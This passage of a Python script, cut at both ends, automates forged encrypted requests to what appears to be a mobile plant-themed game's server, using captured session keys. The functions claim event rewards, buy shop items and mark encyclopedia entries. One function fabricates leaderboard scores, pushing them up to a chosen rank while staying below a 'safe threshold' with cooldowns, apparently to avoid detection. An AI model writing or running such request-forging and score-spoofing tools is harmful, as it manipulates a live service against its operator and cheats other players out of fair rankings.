            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("问卷领取成功")
            else:
                print("问卷领取失败")
            time.sleep(0)
    else:
        print("问卷刷新失败")
    time.sleep(0)
def run_seventieth_sixth_script():
    pi, ui, sk = get_pi_sk(加密)
    while True:
        data = {"req": "V928", "e": {"ad": "0", "c": "0", "is": "0", "pi": pi, "s": "1", "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        si_data = decrypted_json['e']['d']['si']
        filtered_items = [item for item in si_data if item.get('l', 0) == 1]
        processed_items = []
        for idx, item in enumerate(filtered_items, start=1):
            gift_id = str(item["oi"])
            gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
            gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
            colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
            bought = item["q"]
            limit = item["p"]
            line = (f"{idx}. {colored_gift_name}×{bought} 售价{limit}\n")
            print(line)
        try:
            choice = input("\n请输入要购买的序号（1-{}），回车刷新，回车两次结束：".format(len(filtered_items)))
            if choice == "":
                if input("确定结束？（回车确认，输入其他继续）：").strip() == "":
                    break
                continue
            choice = int(choice)
            if choice < 1 or choice > len(filtered_items):
                raise IndexError("序号超出范围")
            selected_item = filtered_items[choice - 1]
            gi_value = selected_item['oi']
            q_value = selected_item['q']
            p_value = selected_item['p']
            data = {"req": "V392", "e": {"ci": p_value, "gi": gi_value, "mi": "23093", "pi": pi, "q": q_value, "si": "8", "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("购买成功")
            else:
                print("购买失败")
        except (ValueError, IndexError) as e:
            print(f"输入错误：{str(e)}，请重新输入")
def run_seventieth_seventh_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10809,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    decrypted_json = json.loads(decrypted_json['e']['d'][0]['data'])
    si_lists = decrypted_json["si"]
    while True:
        for idx, group in enumerate(si_lists):
            print(f"\n第{idx}组植物：")
            for i, item in enumerate(group):
                plant_id_str = str(item['i'])
                price = item['c']
                plant_info = formatted_plant.get(
                    plant_id_str,
                    {"name": f"未知植物({plant_id_str})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                print(f"{i+1}. {color_code}{plant_name}{RESET_COLOR} - 售价{price}")
        input_group = input("\n请输入要购买的组号（0-5，直接回车结束）：")
        if not input_group.strip():
            print("操作终止")
            break
        try:
            gi_value = int(input_group)
            if gi_value < 0 or gi_value >= len(si_lists):
                raise IndexError("组号超出范围")
            group_length = len(si_lists[gi_value])
            input_index = input(f"请输入第{gi_value}组中要购买的植物序号（1-{group_length}，直接回车结束）：")
            if not input_index.strip():
                print("操作终止")
                continue
            ci_value = int(input_index) - 1
            if ci_value < 0 or ci_value >= group_length:
                raise IndexError("序号超出范围")
            data = {"req":"V392","e":{"ci":ci_value,"gi":gi_value,"mi":"23097","pi":pi,"q":"0","si":"9","sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("购买成功")
            else:
                print("购买失败")
        except (ValueError, IndexError) as e:
            print(f"输入错误：{str(e)}，请重新输入")
def run_seventieth_eighth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10840,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    shop_data = json.loads(decrypted_json['e']['d'][0]['data'])
    shop_list = shop_data['shopList']
    print("=== 商店物品列表 ===\n")
    for idx, gift in enumerate(shop_list, start=0):
        gift_id = str(gift["i"])
        gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
        gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
        colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
        bought = gift["f"]
        limit = gift["m"]
        purchase_status = f"({bought}/{limit})"
        currency_id = str(gift["ct"])
        currency_info = formatted_plant.get(currency_id, {"name": f"未知货币({currency_id})", "pinzhi": "default"})
        currency_color = pinzhi_to_color.get(currency_info["pinzhi"], pinzhi_to_color["default"])
        colored_currency = f"{currency_color}{currency_info['name']}{RESET_COLOR}"
        cost = gift["c"]
        line = (f"{idx}. {colored_gift_name}×{gift['q']} {purchase_status} {colored_currency}×{cost}\n")
        print(line)
    user_currency = {"黄币数量": shop_data['playToken'],"紫币数量": shop_data['writeToken']}
    print("\n用户货币余额 =", user_currency)
    while True:
        try:
            idx_input = input("请输入要购买的商品序号（回车退出）：").strip()
            if not idx_input:
                print("已退出购买流程")
                break
            idx = int(idx_input)
            if idx < 0 or idx >= len(shop_list):
                raise ValueError("序号超出范围")
            item = shop_list[idx]
            mi_value = item['ct']
            gi_value = item['i']
            q_value = int(input("请输入购买数量："))
            ci_value = int(item['c']) * q_value
        except ValueError as e:
            print(Fore.RED + f"输入错误：{e}，请重新运行脚本")
        data = {"req":"V392","e":{"ci":ci_value,"gi":gi_value,"mi":mi_value,"pi":pi,"q":q_value,"si":"11","sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("购买成功")
        else:
            print("购买失败")
def run_seventieth_ninth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V972","e":{"c":"0","pi":pi,"s":"0","sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    shop = decrypted_json['e']['d']
    shop_data = decrypted_json['e']['d']['shopList']
    currency_types = {23400: "黄币", 23401: "彩币"}
    print("=== 商店物品列表 ===")
    for idx, gift in enumerate(shop_data, start=0):
        gift_id = str(gift["i"])
        gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
        gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
        colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
        bought = gift["f"]
        limit = gift["m"]
        purchase_status = f"({bought}/{limit})"
        currency_id = str(gift["t"])
        currency_info = formatted_plant.get(currency_id, {"name": f"未知货币({currency_id})", "pinzhi": "default"})
        currency_color = pinzhi_to_color.get(currency_info["pinzhi"], pinzhi_to_color["default"])
        colored_currency = f"{currency_color}{currency_info['name']}{RESET_COLOR}"
        cost = gift["c"]
        line = (f"{idx}. {colored_gift_name}×{gift['q']} {purchase_status} {colored_currency}×{cost}\n")
        print(line)
    user_currency = {"黄蜗牛币数量": shop['userMoney'],"彩蜗牛币数量": shop['userSuperMoney']}
    print("\n用户货币余额 =", user_currency)
    while True:
        try:
            idx_input = input("请输入要购买的商品序号（回车退出）：").strip()
            if not idx_input:
                print("已退出购买流程")
                break
            idx = int(idx_input)
            if idx < 0 or idx >= len(shop_data):
                raise ValueError("序号超出范围")
            item = shop_data[idx]
            mi_value = item['t']
            gi_value = item['i']
            q_value = int(input("请输入购买数量："))
            ci_value = int(item['c']) * q_value
        except ValueError as e:
            print(Fore.RED + f"输入错误：{e}，请重新运行脚本")
        data = {"req":"V392","e":{"ci":ci_value,"gi":gi_value,"mi":mi_value,"pi":pi,"q":q_value,"si":"10","sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("购买成功")
        else:
            print("购买失败")
def run_eightieth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10892,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    shop_data = json.loads(decrypted_json['e']['d'][0]['data'])
    i_values = []
    for task in shop_data.get('task', []):
        for award_item in task.get('award', []):
            i_values.append(award_item.get('i'))
    unique_i = list(set(i_values))
    mi_value = unique_i[0]
    shop_list = shop_data['shopList']
    print("=== 商店物品列表 ===\n")
    for idx, gift in enumerate(shop_list, start=0):
        gift_id = str(gift["i"])
        gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
        gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
        colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
        limit = str(gift["limit"])
        purchase_status = f"({limit})"
        cost = gift["price"]
        line = (f"{idx}. {colored_gift_name}×{gift['q']} 剩余次数{purchase_status} 花费{cost}\n")
        print(line)
    user_currency = {"同游币数量": shop_data['itemNum']}
    print("\n用户货币余额 =", user_currency)
    while True:
        try:
            idx_input = input("请输入要购买的商品序号（回车退出）：").strip()
            if not idx_input:
                print("已退出购买流程")
                break
            idx = int(idx_input)
            if idx < 0 or idx >= len(shop_list):
                raise ValueError("序号超出范围")
            item = shop_list[idx]
            gi_value = item['i']
            q_value = int(input("请输入购买数量："))
            p_value = item['q']
            ci_value = int(item['price'])
        except ValueError as e:
            print(Fore.RED + f"输入错误：{e}，请重新运行脚本")
        for _ in range(q_value):
            data = {"req":"V392","e":{"ci":ci_value,"gi":gi_value,"mi":mi_value,"pi":pi,"q":p_value,"si":"17","sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("购买成功")
            else:
                print("购买失败")
def run_eightieth_first_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10863,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    shop_data = json.loads(decrypted_json['e']['d'][0]['data'])
    shop_list = shop_data['shop_list']
    result = [item for item in shop_list if item['l'] == 1]
    print("=== 商店物品列表 ===\n")
    for idx, gift in enumerate(result, start=0):
        gift_id = str(gift["i"])
        gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
        gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
        colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
        bought = gift["f"]
        limit = gift["m"]
        purchase_status = f"({bought}/{limit})"
        cost = gift["c"]
        line = (f"{idx}. {colored_gift_name}×{gift['q']} {purchase_status} 花费{cost}\n")
        print(line)
    user_currency = {"抽奖币数量": shop_data['pn'],"兑换币数量": shop_data['spn']}
    print("\n用户货币余额 =", user_currency)
    while True:
        try:
            idx_input = input("请输入要购买的商品序号（回车退出）：").strip()
            if not idx_input:
                print("已退出购买流程")
                break
            idx = int(idx_input)
            if idx < 0 or idx >= len(shop_list):
                raise ValueError("序号超出范围")
            item = shop_list[idx]
            mi_value = item['t']
            q_value = int(input("请输入购买数量："))
            ci_value = int(item['c']) * q_value
        except ValueError as e:
            print(Fore.RED + f"输入错误：{e}，请重新运行脚本")
        data = {"req":"V392","e":{"ci":ci_value,"gi":idx,"mi":mi_value,"pi":pi,"q":q_value,"si":"15","sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("购买成功")
        else:
            print("购买失败")
def run_eightieth_second_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10870, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
        return
    elif response_data.get("r") != 0:
        print("牢玩家回归活动打开失败")
        return
    print("牢玩家回归活动打开成功")
    try:
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value is None:
            print("活动未开启")
            return
        data_json_str = decrypted_json['e']['d'][0]['data']
        data_dict = json.loads(data_json_str)
        task_list = data_dict.get('task', [])
        task_reward_list = data_dict.get('task_reward_list', [])
    except Exception as e:
        print(f"解析活动数据失败: {e}")
        return
    award_value = [index for index, item in enumerate(task_reward_list) if item['is_get'] == 0]
    id_value = [task['id'] for task in task_list if task['is_get'] != 1]
    for ti in id_value:
        ti = str(ti)
        data = {"req": "V511", "e": {"index": ti, "pi": pi, "sk": sk, "t": "0", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("回归任务领取成功")
        else:
            print("回归任务领取失败")
    for di in award_value:
        data = {"req": "V511", "e": {"index": di, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("回归奖励领取成功")
        else:
            print("回归奖励领取失败")
    for i in range(6):
        data = {"req": "V512", "e": {"index": i, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("体验卡领取成功")
        else:
            print("体验卡领取失败")
def run_eightieth_third_script():
    pi, ui, sk = get_pi_sk(加密)
    suoyin_value = [1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1039,1040,1041,1042,1043,1044,1045,1047,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1088,1089,1090,1091,1092,1093,1094,1095,1097,1098,1099,111001,111002,111003,111004,111006,111008,111009,111010,111011,111012,111013,111014,111015,111016,111017,111018,111019,111020,111021,111022,111023,111024,111025,111026,111027,111028,111029,111030,111031,111032,111033,111034,111035,111036,111037,111038,111039,111040,111041,111042,111043,111044,111045,111046,111047,111048,111049,111050,111051,111052,111053,111054,111055,111056,111058,111060,111061,111062,111063,111064,111065,111066,111067,111068,111069,111070,111071,111072,111073,111074,111075,111076,111078,111079,111081,111082,111084,111085,111086,111087,111088,111089,111090,111091,200000,200001,200002,200003,200004,200005,200006,200007,200008,200009,200010,200011,200012,200013,200014,200015,200016,200017,200018,200019,200020,200021,200022,200023,200024,200025,200026,200027,200028,200029,200030,200031,200032,200033,200034,200035,200037,200038,200039,200041,200043,200044,200045,200046,200047,200048,200049,200050,200051,200052,200053,200054,200055,200056,200057,200058,200059,200060,200061,200062,200063,200064,200065,200066,200067,200068,200069,200070,200071,200072,200073,200074,200075,200076,200077,200078,200079,200080,200081,200082,200083,200084,200085,200086,200088,200089,200090,200091,200092,200093,200094,200095,200096,200097,200098,200099,200100,200101,200102,200126,200127,200128,200133,200134,200135,200136,200137,200138,200139,200140]
    for id in suoyin_value:
        data={"req": "V1060", "e": {"id": id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print(f"图鉴植物{id}查看成功")
        else:
            print("图鉴植物{id}查看失败")
        time.sleep(0.1)
def run_eightieth_fourth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    zw_list = decrypted_json['e']['d'].get('pl', [])
    for item in zw_list:
        i_value = item['i']
        s_value = item['s']
        found = False
        jieshu_value = None
        for plant_dict in plant_list:
            plant_id = next(iter(plant_dict))
            if int(plant_id) == int(i_value):
                found = True
                jieshu_value = plant_dict.get('jieshu')
                break
        if found:
            s_int = int(s_value)
            jieshu_int = int(jieshu_value)
            if s_int > jieshu_int:
                item['s'] = jieshu_value
            else:
                pass
        else:
            print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
    xdd_list = [111089, 111087, 111035, 111030, 111022, 111019, 1093, 1039, 1012, 1099, 200157]
    rp_list = []
    i_to_s = {}
    for item in zw_list:
        i_str = item.get('i')
        s_str = item.get('s')
        if i_str is None or s_str is None:
            continue
        try:
            i_int = int(i_str)
            s_int = int(s_str)
            i_to_s[i_int] = s_int
        except ValueError:
            continue
    valid_xdd = []
    for xdd_num in xdd_list:
        if xdd_num in i_to_s:
            valid_xdd.append(xdd_num)
    selected_xdd = random.sample(valid_xdd, min(8, len(valid_xdd)))
    for xdd in selected_xdd:
        s_value = i_to_s[xdd]
        q_value = s_value + 1
        rp_list.append({"i": xdd, "q": q_value})
    data = {"req": "V303", "e": {"al": [{"id": 10896, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("关卡刷新成功")
    else:
        print("关卡刷新失败")
    data_str = decrypted_json['e']['d'][0]['data']
    data = json.loads(data_str)
    rg_data = data.get('rg', {})
    rankRatio = rg_data.get('rankRatio', 0)
    current_score = rg_data.get('score')
    totalCount = rg_data.get('totalCount')
    rank = rg_data.get('rank')
    print(f"\n当前总分数：{current_score}")
    print(f"参赛总人数：{totalCount}")
    print(f"当前排名：{rank}")
    print(f"当前排名比：{rankRatio}%\n")
    user_input = input("输入1进行刷分（回车退出）：").strip()
    if user_input == '1':
        l_value = 0
        w_value = ""
        s_value = []
        s_values = 0
        r_value = ""
        hi_list = data['hi']
        for index, item in enumerate(hi_list):
            lecelInfo = item['lecelInfo']
            non_zero_count = sum([1 for sub_item in lecelInfo if sub_item['s'] != 0])
            if index == 0:
                l_value = non_zero_count if non_zero_count <= 3 else l_value
                if non_zero_count == 3 and index + 1 < len(hi_list):
                    next_lecelInfo = hi_list[index + 1]['lecelInfo']
                    next_non_zero_count = sum([1 for sub_item in next_lecelInfo if sub_item['s'] != 0])
                    if next_non_zero_count != 0 and next_non_zero_count <= 3:
                        l_value = next_non_zero_count
                        if next_non_zero_count == 3 and index + 2 < len(hi_list):
                            next_next_lecelInfo = hi_list[index + 2]['lecelInfo']
                            next_next_non_zero_count = sum([1 for sub_item in next_next_lecelInfo if sub_item['s'] != 0])
                            if next_next_non_zero_count != 0 and next_next_non_zero_count <= 3:
                                l_value = next_next_non_zero_count
            s_value.extend([sub_item['s'] for sub_item in lecelInfo])
        s_values = [i for i in s_value[::-1] if i != 0]
        if s_values:
            s_values = s_values[0]
        random_number = random.randint(10000, 99999)
        r_value = str(random_number)
        non_zero_s_count = sum([1 for i in s_value if i != 0])
        if non_zero_s_count <= 3:
            w_value = hi_list[0]['name']
        elif 3 < non_zero_s_count <= 6:
            w_value = hi_list[1]['name']
        elif 6 < non_zero_s_count <= 9:
            w_value = hi_list[2]['name']
        top_values = None
        w_index = None
        for i, item in enumerate(hi_list):
            if item['name'] == w_value:
                w_index = i
                break
        if w_index is not None and l_value in [1, 2, 3]:
            score_index = w_index * 3 + (l_value - 1)
            all_scores = []
            for hi in hi_list:
                for info in hi['lecelInfo']:
                    all_scores.append(info['score'])
            if 0 <= score_index < len(all_scores):
                top_values = all_scores[score_index]
        top_values = int(top_values)
        Rank = input("输入要刷的排名比（回车退出）：").strip()
        if Rank == "":
            return
        elif int(Rank) >= int(rankRatio):
            print("已达到所选排名")
            return
        else:
            rank_value = int(Rank)
        if rank_value:
            if rankRatio >= rank_value or rankRatio == 0:
                random_num = random.randint(200000, 300000)
            data = {"req": "V1090", "e": {"o": "200", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            rank_list = decrypted_json['e']['d']['grl']['rl']
            last_item = rank_list[-1]
            sl_value = int(last_item['s'])
            score_upper_limit = sl_value - 100000
            top_values += random_num
            if top_values >= score_upper_limit:
                top_values = score_upper_limit
            else:
                pass
            while True:
                top_value = top_values / 10.0
                top_value = "{0:.6f}".format(top_value)
                random_number = random.randint(10000, 99999)
                r_value = str(random_number)
                to_value = str(top_value)
                for i in range(10):
                    data = {"req":"V1094","e":{"p":i,"pi":pi,"r": r_value,"s":to_value,"sk":sk,"ui":ui},"ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    try:
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("分数获取成功")
                        else:
                            print("分数获取失败")
                    except json.JSONDecodeError:
                        print("解析响应数据失败")
                    time.sleep(0.2)
                to_values = str(top_values)
                data = {"req": "V1091", "e": {"l": l_value, "pi": ui, "rp": rp_list, "s": to_values, "sk": sk, "ui": ui, "w": w_value}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("关卡刷分成功")
                else:
                    print("关卡刷分失败")
                data = {"req": "V303", "e": {"al": [{"id": 10896, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui,"v": 版本号}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                try:
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 0:
                        print("关卡刷新成功")
                    else:
                        print("关卡刷新失败")
                except json.JSONDecodeError:
                    print("解析响应数据失败")
                data_str = decrypted_json['e']['d'][0]['data']
                data = json.loads(data_str)
                rg_data = data.get('rg', {})
                current_score = rg_data.get('score')
                totalCount = rg_data.get('totalCount')
                rank = rg_data.get('rank')
                rankRatio = rg_data.get('rankRatio', 0)
                print(f"当前总分数：{current_score}")
                print(f"参赛总人数：{totalCount}")
                print(f"当前排名：{rank}")
                print(f"当前排名比：{rankRatio}%")
                if rankRatio <= rank_value:
                    print("已达到目标排名比，停止刷分")
                    break
                print("\n等待30s冷却")
                time.sleep(30)
                random_num = random.randint(900000, 1000000)
                top_values += random_num
                if top_values >= score_upper_limit:
                    print("当前分数已达到安全阈值，停止刷分")
                    top_values = score_upper_limit
                else:
                    pass
        else:
            print("已退出")
    else:
        print("已退出")
def run_eightieth_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10728, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    op_value = decrypted_json["e"]["d"][0].get("op")
    data = {"req": "V303", "e": {"al": [{"id": 10729, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        shop_data = json.loads(decrypted_json['e']['d'][0]['data'])
        shop_list = shop_data['il']
        print("=== 商店物品列表 ===")
        for idx, gift in enumerate(shop_list, start=0):
            gift_id = str(gift["i"])
            gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
            gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
            colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
            bought = gift["d"]
            purchase_status = f"({bought})"
            currency_id = str(gift["needItem"])
            currency_info = formatted_plant.get(currency_id, {"name": f"未知货币({currency_id})", "pinzhi": "default"})
            currency_color = pinzhi_to_color.get(currency_info["pinzhi"], pinzhi_to_color["default"])
            colored_currency = f"{currency_color}{currency_info['name']}{RESET_COLOR}"
            cost = gift["c"]
            line = (f"{idx}. {colored_gift_name}×{gift['q']}阶(次) {purchase_status}折(次) {colored_currency}×{cost}\n")
            print(line)
        user_input = input("请输入（输入q查看明日拼团预告，空回车跳过）：")
        if user_input.strip().lower() == 'q':
            shop_list = shop_data['nt']
            print("=== 商店物品列表 ===")
            for idx, gift in enumerate(shop_list, start=0):
                gift_id = str(gift["i"])
                gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
                gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
                colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
                bought = gift["d"]
                purchase_status = f"({bought})"
                currency_id = str(gift["needItem"])
                currency_info = formatted_plant.get(currency_id, {"name": f"未知货币({currency_id})", "pinzhi": "default"})
                currency_color = pinzhi_to_color.get(currency_info["pinzhi"], pinzhi_to_color["default"])
                colored_currency = f"{currency_color}{currency_info['name']}{RESET_COLOR}"
                cost = gift["c"]
                line = (f"{idx}. {colored_gift_name}×{gift['q']}阶(次) {purchase_status}折(次) {colored_currency}×{cost}\n")
                print(line)
        elif not user_input.strip():
            print("已跳过脚本运行")
        else:
            print("输入无效，请重新尝试")
        while True:
            try:
                idx_input = input("请输入要购买的商品序号（回车退出）：").strip()
                if not idx_input:
                    print("已退出购买流程")
                    break
                idx = int(idx_input)
                if idx < 0 or idx >= len(shop_list):
                    raise ValueError("序号超出范围")
                item = shop_list[idx]
                mi_value = item['needItem']
                gi_value = item['i']
                q_value = int(input("请输入购买数量："))
                ci_value = int(item['c']) * q_value
            except ValueError as e:
                print(Fore.RED + f"输入错误：{e}，请重新运行脚本")
            data = {"req":"V392","e":{"ci":ci_value,"gi":gi_value,"mi":mi_value,"pi":pi,"q":q_value,"si":"3","sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("购买成功")
            else:
                print("购买失败")
    else:
        print(f"未知的op值：{op_value}")
def run_eightieth_sixth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10871, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        nested_data_str = decrypted_json['e']['d'][0]['data']
        nested_data = json.loads(nested_data_str)
        i_value = []
        for task in nested_data['task']:
            if task['s'] == 0:
                i_value.append(task['i'])
